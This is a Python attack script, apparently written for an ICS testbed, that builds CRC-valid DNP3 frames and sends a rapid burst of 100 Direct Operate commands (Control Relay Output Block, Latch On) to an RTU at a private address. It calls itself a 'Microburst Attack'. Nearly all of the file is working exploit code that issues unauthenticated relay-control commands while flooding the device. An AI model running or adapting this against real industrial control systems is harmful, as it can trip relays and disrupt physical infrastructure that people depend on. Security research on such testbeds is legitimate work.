import socket
import time

TARGET_IP = "10.0.30.10"
TARGET_PORT = 20000
NUM_PACKETS = 100


def dnp3_crc(data: bytes) -> bytes:
    """
    DNP3固有のCRC-16計算 (多項式 0xA6BC, reflected)。
    IEC/DNP3.org仕様の標準実装。
    """
    crc = 0x0000
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x0001:
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc = crc >> 1
    crc = (~crc) & 0xFFFF
    return crc.to_bytes(2, byteorder="little")


def build_dnp3_frame(dest_addr: int, src_addr: int, user_data: bytes) -> bytes:
    """
    正しいCRC付きDNP3 TCPフレームを構築する。

    データリンク層ヘッダー: Start(2) + Length(1) + Control(1) + Dest(2) + Src(2) + CRC(2)
    ユーザーデータ: 16バイトごとのブロックに分割し、各ブロックにCRC(2)を付与
    """
    # Length = Control(1) + Dest(2) + Src(2) + user_data の合計バイト数
    length = 5 + len(user_data)

    header = bytes([length, 0xC4]) + dest_addr.to_bytes(2, "little") + src_addr.to_bytes(2, "little")
    header_crc = dnp3_crc(header)

    frame = b"\x05\x64" + header + header_crc

    # ユーザーデータ (Transport + Application層) を16バイトごとのブロックに分割
    for i in range(0, len(user_data), 16):
        block = user_data[i:i + 16]
        frame += block + dnp3_crc(block)

    return frame


def build_direct_operate_user_data() -> bytes:
    """
    Transport層 + Application層のユーザーデータを構築する。

    Transport Header: FIN=1, FIR=1, SEQ=0 -> 0xC0
    Application Header:
      - App Control: FIR=1, FIN=1, CON=0, UNS=0, SEQ=0 -> 0xC0
      - Function Code: 0x05 (Direct Operate)
    Object Header (CROB: Group 12, Var 1, Control Relay Output Block):
      - Group = 12, Variation = 1
      - Qualifier = 0x17 (8-bit start/stop index, 1点のみ)
      - Range: Start=0, Stop=0 (index 0 の1点のみ操作)
      - CROB Object (11 bytes):
          Control Code = 0x41 (Latch On, Trip/Close bit setで開放)
          Count = 1
          On Time = 0 (4 bytes)
          Off Time = 0 (4 bytes)
          Status = 0
    """
    transport_header = bytes([0xC0])
    app_control = bytes([0xC0])
    function_code = bytes([0x05])  # Direct Operate

    group = bytes([12])
    variation = bytes([1])
    qualifier = bytes([0x17])
    range_field = bytes([0x00, 0x00])  # start=0, stop=0

    crob = bytes([
        0x41,                   # Control Code: Latch On
        0x01,                   # Count
        0x00, 0x00, 0x00, 0x00,  # On Time
        0x00, 0x00, 0x00, 0x00,  # Off Time
        0x00,                    # Status
    ])

    application_layer = app_control + function_code + group + variation + qualifier + range_field + crob

    return transport_header + application_layer


def main():
    print(f"[*] Starting Microburst Attack on {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Sending {NUM_PACKETS} valid DNP3 Direct Operate (FC=0x05) frames (CRC-validated) as fast as possible...")

    user_data = build_direct_operate_user_data()
    # 送信元アドレス=1 (仮のマスタアドレス), 宛先アドレス=4 (仮のRTUアドレス)
    dnp3_frame = build_dnp3_frame(dest_addr=4, src_addr=1, user_data=user_data)

    print(f"[*] Frame length: {len(dnp3_frame)} bytes")
    print(f"[*] Frame hex: {dnp3_frame.hex()}")

    # RTU側 (target_rtu.py) は1接続につき1回recv()した直後にソケットを
    # closeする実装のため、接続を使い回さず、送信のたびに新規接続を張る。
    sent_count = 0
    start = time.perf_counter()
    for i in range(NUM_PACKETS):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(dnp3_frame)
            sent_count += 1
        except Exception as e:
            print(f"[-] Packet {i} error: {e}")
        finally:
            s.close()
    end = time.perf_counter()

    elapsed = end - start
    print(f"[+] Sent {sent_count}/{NUM_PACKETS} packets in {elapsed:.4f} seconds.")
    if elapsed > 0:
        print(f"[+] Burst Rate: {sent_count / elapsed:.2f} packets/sec")

    print("[*] Microburst Attack Completed.")


if __name__ == "__main__":
    main()
